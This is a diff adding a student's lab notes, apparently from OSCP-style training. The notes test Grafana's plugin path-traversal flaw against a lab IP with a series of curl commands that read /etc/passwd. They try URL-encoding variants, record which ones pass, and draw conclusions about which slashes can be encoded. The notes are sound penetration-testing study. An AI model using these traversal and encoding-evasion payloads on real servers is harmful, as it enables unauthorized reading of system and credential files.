@@ -47,6 +47,35 @@ NOTE: 2e hexidecimal is 46. 46 in ascii is a DOT or period ".". no need to encod
 Lab notes: Q1 had us look for the flag in /opt/passwords... is the /opt folder supposed to be something we check? Is there a way that we can automate directory traversal to locate low hanging fruit?
 This reddit has a couple of good answers on some files to check.. one mentioned loading Seclists/fuzzing/LFI into burp intruder as a way to automate -- https://www.reddit.com/r/oscp/comments/1ae050m/path_traversal/
 
+WORKING PAYLOAD -- NOTE: REPLACING curl from any payloads that failed with the word FAILED so that they do not populate in a search!
+curl --path-as-is http://192.168.162.16:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
+
+CASE: only encoding the dots in between /'s -- passed
+curl --path-as-is http://192.168.162.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+Something else I noticed is that non-encoded payloads need the --path-as-is argument. Encoded payloads work the same with or without the argument
+
+CASE: Everything is encoded -- failed
+failed %68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%36%32%2e%31%36%3a%33%30%30%30%2f%70%75%62%6c%69%63%2f%70%6c%75%67%69%6e%73%2f%61%6c%65%72%74%6c%69%73%74%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+
+CASE: everything between alertlist/ and /etc/passwd is encoded -- pass
+curl http://192.168.162.16:3000/public/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
+
+CASE: Slash after alertlist is encoded -- fail
+failed http://192.168.162.16:3000/public/plugins/alertlist%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
+
+CASE: slash in /etc/passwords are replaced -- pass
+curl http://192.168.162.16:3000/public/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd
+
+CASE: encoding the word public in the uri -- pass
+curl http://192.168.162.16:3000/%70%75%62%6c%69%63/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd
+
+CASE: Encoding the slashes in front and behind plugins -- fail
+failed http://192.168.162.16:3000/%70%75%62%6c%69%63%2fplugins%2falertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd
+
+Conclusion: I have to be careful which slashes I encode.... I can encode any slashes after the first one in alertslist/ and I can encode any word in between slashes after the hostname:port. 
+However encoding slashes in the regular url will break the request.... Is this observation specific to Grafana or with any directory traversal?
+
 
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
